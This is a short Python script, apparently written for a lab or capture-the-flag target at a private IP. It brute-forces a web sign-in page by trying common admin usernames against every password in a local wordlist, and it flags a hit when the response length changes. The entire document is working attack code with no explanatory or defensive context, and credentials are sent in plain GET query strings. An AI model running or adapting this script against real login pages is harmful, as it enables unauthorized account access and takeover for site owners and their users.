import requests


url = 'http://192.168.56.101/'

username = '';
password = 'test';

result = requests.get(url + '?page=signin&username=' + username + '&password=' + password + '&Login=Login');
res_len = len(result.content);

usernames = ['admin', 'Admin', 'administrator', 'Administrator', 'Admin', 'user1']

for u in usernames:
  f = open('./password.txt', 'r')
  while 1:
    line = f.readline();
    if line == '':
      f.close();
      break

    result = requests.get(url + '?page=signin&username=' + u + '&password=' + line[:-1] + '&Login=Login');
    if res_len != len(result.content):
      print('Found!\n' + 'username:' + u + ' -> ' + 'password:' + line[:-1])
      exit()
    else:
      print('Test -> ' + 'username:' + u + ' -> ' + 'password:' + line[:-1])
  